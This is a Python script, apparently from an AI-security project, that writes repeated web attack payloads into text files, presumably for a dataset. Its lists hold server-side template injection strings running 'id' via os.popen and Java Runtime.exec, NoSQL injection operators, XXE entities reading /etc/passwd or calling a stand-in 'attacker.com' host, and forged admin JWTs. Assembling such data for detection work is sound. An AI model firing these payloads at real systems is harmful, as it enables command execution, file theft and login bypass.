import os

new_dir = r"d:\AI\ai_security\data\new"
os.makedirs(new_dir, exist_ok=True)

ssti = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{% set a=1 %}", "{{config.items()}}",
    "{{\"\".__class__.__mro__[1].__subclasses__()}}", '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
    '${T(java.lang.Runtime).getRuntime().exec("id")}', '*{T(java.lang.Runtime).getRuntime().exec("id")}',
    '${@java.lang.Runtime@getRuntime().exec("id")}'
]

nosqli = [
    '{"$gt": ""}', '{"$ne": null}', '{"$ne": 1}', '{"$regex": ".*"}', '{"$where": "1==1"}',
    "admin' || '1'=='1", "'; return (true); //", '{"$regex": "^admin"}',
    '{"$exists": true}', '{"$nin": ["invalid"]}', '{"$type": 2}'
]

xxe = [
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
    '<!ENTITY % xxe SYSTEM "php://filter/base64-encode/resource=index.php">',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
]

jwt = [
    'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.',
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.', # signature stripped
    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ',
    'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.evil_signature'
]

def write_times(filename, arr, times=100):
    with open(os.path.join(new_dir, filename), "w", encoding="utf-8") as f:
        for _ in range(times):
            for item in arr:
                f.write(item + "\n")

write_times("ssti.txt", ssti, 150)
write_times("nosqli.txt", nosqli, 150)
write_times("xxe.txt", xxe, 150)
write_times("jwt.txt", jwt, 150)
print("Generated new payload files!")
